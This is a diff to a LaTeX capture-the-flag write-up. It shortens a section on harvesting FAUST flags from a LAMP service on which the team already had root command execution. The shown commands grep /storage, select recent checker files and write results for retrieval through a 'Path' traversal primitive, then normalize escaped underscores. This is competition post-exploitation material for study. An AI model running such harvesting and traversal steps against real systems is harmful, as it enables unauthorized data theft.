@@ -1,182 +1,23 @@
-% ============================================================
-% 07 -- FLAG HARVESTING
-% ============================================================
-
-\section{Finding and Harvesting the Flags}
+\section{Finding the Flags}
 \label{sec:flag-harvesting}
 
-At this point, we could execute arbitrary shell commands inside the LAMP
-container.
+On our own instance, checker-created ship names held flags in files beneath
+\code{/storage}. The storage routine represented the underscore in a FAUST
+flag as \code{\textbackslash Uchar95}, so the on-disk value needed
+normalization before submission.
 
-That solved the difficult part.
-
-The remaining question was considerably more practical:
-
-\begin{center}
-  \displayfont\large\bfseries
-  where are the flags?
-\end{center}
-
-
-% ------------------------------------------------------------
-% 7.1
-% ------------------------------------------------------------
-
-\subsection{Flags as Ship Names}
-
-Inspecting the state of our own service showed checker-created users with
-ship names resembling:
+An initial \code{grep -R FAUST /storage} recovered many old entries. To
+favor recent checker state, we selected the newest files whose usernames
+matched the observed 16-character pattern. Two carrier commands wrote the
+candidate list and matching lines to files that \code{Path} could retrieve:
 
 \begin{lstlisting}
-FAUST\Uchar95 ...
-\end{lstlisting}
-
-This matched the registration behaviour discussed earlier.
-
-Ship names were persisted into files beneath:
-
-\begin{lstlisting}
-/storage/
-\end{lstlisting}
-
-which meant the checker was effectively leaving the service flag inside
-the user's stored ship data.
-
-A normal FAUST flag has the form:
-
-\begin{lstlisting}
-FAUST_<32 characters>
-\end{lstlisting}
-
-but LAMP's storage escaping transformed the underscore into:
-
-\begin{lstlisting}
-\Uchar95
-\end{lstlisting}
-
-So the value on disk looked more like:
-
-\begin{lstlisting}
-FAUST\Uchar95 ABCDEFGHIJKLMNOPQRSTUVWXYZ012345
-\end{lstlisting}
-
-rather than the normal flag representation.
-
-
-% ------------------------------------------------------------
-% 7.2
-% ------------------------------------------------------------
-
-\subsection{The First Approach: Grep Everything}
-
-With root command execution available, the obvious first attempt was
-approximately:
-
-\begin{lstlisting}
-grep -R FAUST /storage >/x
-\end{lstlisting}
-
-The output could then be retrieved using the existing \code{Path}
-primitive:
-
-\begin{lstlisting}
-Path: /../../x
-\end{lstlisting}
-
-This worked.
-
-It also returned a lot of old data.
-
-Attack/Defense services continuously receive new checker state, so
-dumping the entire storage directory produced many historical flags that
-were already stale by the time they were submitted.
-
-The exploit therefore worked technically, but the harvesting strategy
-needed to become more selective.
-
-
-% ------------------------------------------------------------
-% 7.3
-% ------------------------------------------------------------
-
-\subsection{Looking at Recent Checker Files}
-
-During testing, recent checker-created storage files commonly used
-16-character usernames.
-
-Instead of searching every file under \code{/storage}, the harvester
-therefore concentrated on recently modified files matching that observed
-shape:
-
-\begin{lstlisting}
-ls -1t /storage/????????????????.tex
-\end{lstlisting}
-
-The list was then restricted to a small number of recent candidates:
-
-\begin{lstlisting}
-ls -1t /storage/????????????????.tex \
-  | head -30
-\end{lstlisting}
-
-This greatly reduced the amount of stale service state that needed to be
-processed.
-
-
-% ------------------------------------------------------------
-% 7.4
-% ------------------------------------------------------------
-
-\subsection{Two-Stage Harvesting}
-
-The final harvesting strategy used two command carriers.
-
-The first created a list of recent candidate files:
-
-\begin{lstlisting}
-ls -1t /storage/????????????????.tex \
-  | head -30 >/v3
-\end{lstlisting}
-
-The second searched only those files:
-
-\begin{lstlisting}
+ls -1t /storage/????????????????.tex | head -30 >/v3
 cat /v3 | xargs grep -h FAUST >/v4
 \end{lstlisting}
 
-The resulting file:
-
-\begin{lstlisting}
-/v4
-\end{lstlisting}
-
-could again be downloaded through the \code{Path} traversal.
-
-This kept the actual TeX launcher tiny while allowing the commands stored
-inside the carrier files to perform the larger filesystem operations.
-
-
-% ------------------------------------------------------------
-% 7.5
-% ------------------------------------------------------------
-
-\subsection{Turning Stored Values Back Into Flags}
-
-The retrieved data still contained LAMP's TeX escaping.
-
-In particular:
-
-\begin{lstlisting}
-\Uchar95
-\end{lstlisting}
-
-needed to become:
-
-\begin{lstlisting}
-_
-\end{lstlisting}
-
-The final extraction pipeline therefore used:
+The attacking machine then restored escaped underscores, kept strings
+matching the FAUST flag shape, and removed duplicates:
 
 \begin{lstlisting}
 perl -pe 's/\\Uchar95\s*/_/g' |
@@ -184,74 +25,6 @@ grep -aoE 'FAUST_[A-Za-z0-9+/]{32}' |
 sort -u
 \end{lstlisting}
 
-The first stage restores the escaped underscore.
-
-The second keeps only valid-looking FAUST flags.
-
-The final \code{sort -u} removes duplicates before submission.
-
-
-% ------------------------------------------------------------
-% 7.6
-% ------------------------------------------------------------
-
-\subsection{The Full Data Path}
-
-At this point, the complete flag path was understood:
-
-\begin{center}
-\begin{tabular}{c}
-  checker creates user \\[0.3em]
-  $\downarrow$ \\[0.3em]
-  flag becomes ship name \\[0.3em]
-  $\downarrow$ \\[0.3em]
-  ship name stored in \code{/storage/<user>.tex} \\[0.3em]
-  $\downarrow$ \\[0.3em]
-  carrier command searches recent files \\[0.3em]
-  $\downarrow$ \\[0.3em]
-  matching lines written to temporary output \\[0.3em]
-  $\downarrow$ \\[0.3em]
-  \code{Path:} retrieves output \\[0.3em]
-  $\downarrow$ \\[0.3em]
-  \code{\textbackslash Uchar95} becomes \code{\_} \\[0.3em]
-  $\downarrow$ \\[0.3em]
-  valid flags extracted
-\end{tabular}
-\end{center}
-
-\begin{findingbox}
-The flags were not stored in a dedicated flag database or obvious
-flag file.
-
-They were part of normal application state: checker-created ship names
-persisted beneath \code{/storage}.
-\end{findingbox}
-
-
-% ------------------------------------------------------------
-% 7.7
-% ------------------------------------------------------------
-
-\subsection{From Exploit to Harvester}
-
-We now had every technical piece required to steal a flag:
-
-\begin{center}
-  \displayfont
-  create carrier
-  $\longrightarrow$
-  trigger RCE
-  $\longrightarrow$
-  search recent storage
-  $\longrightarrow$
-  retrieve result
-  $\longrightarrow$
-  normalize flags
-\end{center}
-
-Doing that once by hand was satisfying.
-
-Doing it repeatedly against hundreds of teams by hand would have been
-completely deranged.
-
-So the next step was automation.
+The 16-character filename pattern came from observed checker accounts,
+not a service guarantee. It improved freshness during the competition
+but could miss flags if the checker changed its naming scheme.
